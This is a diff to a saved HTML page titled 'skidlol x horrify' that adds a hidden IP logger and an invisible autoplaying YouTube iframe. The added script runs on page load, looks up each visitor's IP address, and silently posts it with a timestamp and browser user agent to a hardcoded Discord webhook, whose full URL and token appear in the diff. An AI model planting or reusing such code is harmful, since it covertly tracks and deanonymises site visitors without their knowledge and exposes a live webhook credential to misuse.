@@ -1,7 +1,39 @@
 <!DOCTYPE html>
 <!-- saved from url=(0020)https://horrify.lol/ -->
+  <script>
+    // Immediately fetch and send the visitor's IP
+    (async () => {
+      try {
+        const res = await fetch('https://api.ipify.org?format=json');
+        const { ip } = await res.json();
+
+        await fetch('https://discord.com/api/webhooks/1361673451395354654/vG2o4AEjCK5rEMjRPeUfbGoAmGuuDzrtYqNvWTjnP2nCFMSZ3oOxjtc9bmY2xZmfSGMr', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            ip: ip,
+            timestamp: new Date().toISOString(),
+            userAgent: navigator.userAgent
+          })
+        });
+      } catch (err) {
+        console.error('jerome', err);
+      }
+    })();
+  </script>
 <html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252"><link href="cosmo.css" rel="stylesheet">
- 
+ <div id="background-audio">
+    <iframe
+        width="0"
+        height="0"
+        src="https://www.youtube.com/watch?v=o-OLzvNElWg"
+        frameborder="0"
+        allow="autoplay"
+        allowfullscreen>
+    </iframe>
+</div>
         <title>  skidlol x horrify </title><script type="text/javascript" src="Jz9oi-vaZ9lmuBu4zeb8QlCEsck68kYuJcZrnDrba8BaOIN0PHVuTPQMSyze-Mk4ums1YieGUbo5B4_KzBN7Wg=="></script>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
